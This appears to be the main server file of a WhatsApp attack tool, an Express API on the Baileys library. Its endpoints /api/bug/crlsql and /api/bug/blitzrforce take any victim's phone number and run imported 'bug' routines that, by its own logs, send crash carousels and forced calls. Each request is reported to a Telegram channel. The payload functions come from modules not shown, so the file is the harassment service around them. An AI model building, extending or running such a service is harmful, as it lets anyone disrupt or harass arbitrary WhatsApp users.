console.clear();
require('./public/settings/config');
console.log('starting...');
process.on("uncaughtException", console.error);

const {
  default: makeWASocket,
  prepareWAMessageMedia,
  removeAuthState,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  generateWAMessageFromContent,
  generateWAMessageContent,
  generateWAMessage,
  jidDecode,
  proto,
  delay,
  relayWAMessage,
  getContentType,
  generateMessageTag,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  fetchLatestWaWebVersion,
  InteractiveMessage,
  makeCacheableSignalKeyStore,
  Browsers,
  generateForwardMessageContent,
  MessageRetryMap
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const readline = require("readline");
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const { CrlSqL, BlitzrForce } = require("./public/service/bugs");
const { getRequest, sendTele } = require("./public/engine/telegram");

app.enable("trust proxy");
app.set("json spaces", 2);
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(
  bodyParser.raw({
    limit: "50mb",
    type: "*/*",
  })
);

const { Boom } = require("@hapi/boom");
const usePairingCode = true;

const question = (text) => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => {
    rl.question(text, resolve);
  });
};

async function clientstart() {
  const { state, saveCreds } = await useMultiFileAuthState(`./session`);
  const { version, isLatest } = await fetchLatestBaileysVersion();
  const client = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
  });

  if (!client.authState.creds.registered) {
    const phoneNumber = await question(
      "Please enter your WhatsApp number, starting with 62:\n> "
    );
    const code = await client.requestPairingCode(phoneNumber, "PAINBAIL");
    console.log(`Your pairing code: ${code}`);
  }

  // === API: CrlSql ===
  app.get("/api/bug/crlsql", async (req, res) => {
    const { target, fjids } = req.query;
    if (!target)
      return res.status(400).json({
        status: false,
        message: "parameter target diperlukan",
      });
    if (!fjids)
      return res.status(400).json({
        status: false,
        message: "parameter fjids diperlukan",
      });

    let bijipeler = target.replace(/[^0-9]/g, "");
    if (bijipeler.startsWith("0"))
      return res.json("gunakan awalan kode negara!");

    let cuki = bijipeler + "@s.whatsapp.net";
    const info = await getRequest(req);
    try {
      await CrlSqL(client, cuki, fjids);
      res.json({
        status: true,
        creator: global.creator,
        result: "sukses",
      });
      console.log(`✅ Successfully sent carousels to number ${cuki}`);
      const penis = `\n[API HIT]

Endpoint: CrlSql
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
${info.timestamp}`;
      sendTele(penis);
    } catch (error) {
      console.error(error);
      res.status(500).json({
        status: false,
        error: error.message,
      });
    }
  });

  // === API: BlitzrForce ===
  app.get("/api/bug/blitzrforce", async (req, res) => {
    const { target } = req.query;
    if (!target)
      return res.status(400).json({
        status: false,
        message: "parameter target diperlukan",
      });

    let bijipeler = target.replace(/[^0-9]/g, "");
    if (bijipeler.startsWith("0"))
      return res.json("gunakan awalan kode negara!");

    let cuki = bijipeler + "@s.whatsapp.net";
    const info = await getRequest(req);
    try {
      await BlitzrForce(client, cuki);
      res.json({
        status: true,
        creator: global.creator,
        result: "sukses",
      });
      console.log(`✅ Successfully sent forcecall to number ${cuki}`);
      const penis = `\n[API HIT]

Endpoint: BlitzrForce
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
${info.timestamp}`;
      sendTele(penis);
    } catch (error) {
      console.error(error);
      res.status(500).json({
        status: false,
        error: error.message,
      });
    }
  });

  client.ev.on("connection.update", (update) => {
    const { konek } = require("./public/connection/connect");
    konek({
      client,
      update,
      clientstart,
      DisconnectReason,
      Boom,
    });
  });

  client.ev.on("creds.update", saveCreds);
  return client;
}

clientstart();

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server is running on port ${PORT}`);
}).on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.error(`❌ Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, "0.0.0.0", () => {
      console.log(`🚀 Server is running on port ${newPort}`);
    });
  } else {
    console.error("❌ An error occurred:", err.message);
  }
});

// === Hot reload watcher ===
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`♻️ ${__filename} updated!`);
  delete require.cache[file];
  require(file);
});